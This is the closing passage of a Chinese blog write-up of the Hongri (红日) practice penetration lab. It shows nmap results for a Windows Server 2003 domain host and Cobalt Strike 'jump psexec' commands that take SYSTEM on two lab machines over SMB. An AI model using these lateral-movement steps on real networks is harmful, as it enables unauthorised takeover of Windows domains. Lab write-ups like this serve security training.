+|_http-title: You are not authorized to view this page
+| ssl-cert: Subject: commonName&#x3D;root-tvi862ubeh.god.org
+| Subject Alternative Name: DNS:root-tvi862ubeh.god.org, DNS:root-tvi862ubeh
+| Not valid before: 2019-08-24T14:10:51
+|_Not valid after:  2020-08-23T20:10:51
+|_ssl-date: 2026-03-11T11:00:25+00:00; -2s from scanner time.
+| sslv2:
+|   SSLv2 supported
+|   ciphers:
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+8099&#x2F;tcp open  http            Microsoft IIS httpd 6.0
+|_http-server-header: Microsoft-IIS&#x2F;6.0
+|_http-title: The page must be viewed over a secure channel
+1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;su
+bmit.cgi?new-service :
+SF-Port777-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;11%Time&#x3D;69B14AB3%P&#x3D;i686-pc-windows-windows%r
+SF:(TerminalServerCookie,A,&quot;\x01\0\t\xe0\x06\x01\0\t\xe0\x06&quot;)%r(Kerberos,
+SF:5,&quot;\x01\0\t\xe0\x06&quot;)%r(SMBProgNeg,5,&quot;\x01\0\t\xe0\x06&quot;)%r(TerminalServ
+SF:er,A,&quot;\x01\0\t\xe0\x06\x01\0\t\xe0\x06&quot;)%r(WMSRequest,5,&quot;\x01\0\t\xe0\x
+SF:06&quot;);
+MAC Address: 00:0C:29:CC:D0:E0 (VMware)
+Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows, cpe:&#x2F;o:microsoft:windows_server_2003
+
+Host script results:
+|_clock-skew: mean: -2h40m01s, deviation: 4h37m05s, median: -2s
+|_nbstat: NetBIOS name: ROOT-TVI862UBEH, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:cc:d0:e0 (VMware)
+| smb-os-discovery:
+|   OS: Windows Server 2003 3790 (Windows Server 2003 5.2)
+|   OS CPE: cpe:&#x2F;o:microsoft:windows_server_2003::-
+|   Computer name: root-tvi862ubeh
+|   NetBIOS computer name: ROOT-TVI862UBEH\x00
+|   Domain name: god.org
+|   Forest name: god.org
+|   FQDN: root-tvi862ubeh.god.org
+|_  System time: 2026-03-11T18:59:35+08:00
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 257.53 seconds</code></pre>
+
+<p>这里两个主机都开放了 SMB 协议的 445 端口，可以使用 CS 内置的 <code>psexec</code> 工具获取 system shell</p>
+<p>‍</p>
+<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>这里 CS 需要先创建一个 SMB 监听器</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311190659-pje3xbg.png" alt="image"></p>
+<p>这里我还是有那个解析错误的问题，不知道是为什么，只能手动导入目标</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311201008-hvigwml.png" alt="image"></p>
+<p>然后对目标进行横向移动</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311201020-td0g00q.png" alt="image"></p>
+<p>监听器选择 SMB 的，勾选下面的选项</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311201052-8y7y9g1.png" alt="image"></p>
+<p>这里应该就是他解析这个名称的问题，这样执行会失败，我在靶机上也是这个结果，dns 也没有问题，计算机玄学（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311201228-6clw6fg.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311201252-xdlq6p3.png" alt="image"></p>
+<p>所以这里只能将这个域修改为 IP，这个就可以拿到权限了</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">jump psexec 192.168.52.138 nwhx
+jump psexec 192.168.52.141 nwhx</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311201359-m46rh3e.png" alt="image"></p>
+<p>这里成功拿到内网全部权限</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311201447-9i06xsi.png" alt="image"></p>
+<blockquote>
+<p>感觉还是 CS 好用（</p>
+</blockquote>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Marin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://wwwmarin.xyz/2026/03/17/hong-ri-ba-chang-1/">https://wwwmarin.xyz/2026/03/17/hong-ri-ba-chang-1/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Marin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">内网渗透</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/">
+                                    <span class="chip bg-color">红日靶场系列</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2026/03/17/hong-ri-ba-chang-1/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/76dty8y5jpmit0o32n6a4dpr3.jpg" class="responsive-img" alt="红日靶场 1">
+                        
+                        <span class="card-title">红日靶场 1</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-03-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/">
+                        <span class="chip bg-color">红日靶场系列</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2026/03/17/hong-ri-ba-chang-2/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/76dty8y5jpmit0o32n6a4dpr3.jpg" class="responsive-img" alt="红日靶场 2">
+                        
+                        <span class="card-title">红日靶场 2</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-03-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/">
+                        <span class="chip bg-color">红日靶场系列</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4, h5, h6'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2026</span>
+            
+            <a href="/about" target="_blank">Marin</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
